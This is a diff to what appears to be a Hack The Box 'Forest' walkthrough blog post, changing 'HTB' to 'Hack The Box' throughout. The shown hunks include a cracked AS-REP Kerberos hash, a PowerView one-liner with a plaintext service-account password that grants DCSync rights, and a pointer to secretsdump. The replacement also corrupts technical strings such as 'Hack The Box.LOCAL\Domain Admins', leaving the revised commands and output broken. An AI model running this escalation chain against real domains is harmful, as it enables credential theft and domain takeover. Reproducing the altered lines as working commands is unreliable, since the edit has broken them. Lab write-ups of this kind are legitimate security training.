@@ -1,9 +1,9 @@
 ---
-title: "Forest Walkthrough(HTB)"
+title: "Forest Walkthrough(Hack The Box)"
 date: 2025-03-07
 draft: false
 description: "Forest in an easy difficulty Windows Domain Controller (DC), for a domain in which Exchange Server has been installed. The DC is found to allow anonymous LDAP binds, which is used to enumerate domain objects. The password for a service account with Kerberos pre-authentication disabled can be cracked to gain a foothold. The service account is found to be a member of the Account Operators group, which can be used to add users to privileged Exchange groups. The Exchange group membership is leveraged to gain DCSync privileges on the domain and dump the NTLM hashes."
-tags: ["Easy", "windows","HTB", "hacking", "Active Directory", "walkthrough"]
+tags: ["Easy", "windows","Hack The Box", "hacking", "Active Directory", "walkthrough"]
 ---
 
 
@@ -16,7 +16,7 @@ PORT      STATE SERVICE      VERSION
 135/tcp   open  msrpc        Microsoft Windows RPC
 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
 389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
-445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: Hack The Box)
 464/tcp   open  kpasswd5?
 593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
 636/tcp   open  tcpwrapped
@@ -220,12 +220,12 @@ Dictionary cache hit:
 * Bytes.....: 139921507
 * Keyspace..: 14344385
 
-$krb5asrep$23$svc-alfresco@HTB.LOCAL:96ff40e8c8c6d4249819d886c49788a1$......<redacted>:<Password-Redacted>
+$krb5asrep$23$svc-alfresco@Hack The Box.LOCAL:96ff40e8c8c6d4249819d886c49788a1$......<redacted>:<Password-Redacted>
                                                           
 Session..........: hashcat
 Status...........: Cracked
 Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
-Hash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:96ff40e8c8c6d4...fc3980
+Hash.Target......: $krb5asrep$23$svc-alfresco@Hack The Box.LOCAL:96ff40e8c8c6d4...fc3980
 Time.Started.....: Mon Jan 13 21:57:43 2025 (1 sec)
 Time.Estimated...: Mon Jan 13 21:57:44 2025 (0 secs)
 Kernel.Feature...: Pure Kernel
@@ -293,7 +293,7 @@ Import-Module .\powerview.ps1
 ```
 - This is the one liner
 ```shell
- Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
+ Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'Hack The Box.LOCAL\Domain Admins' -Rights DCSync
 ```
 - Atlast I can run secrets dump to dump all those secrets 
 
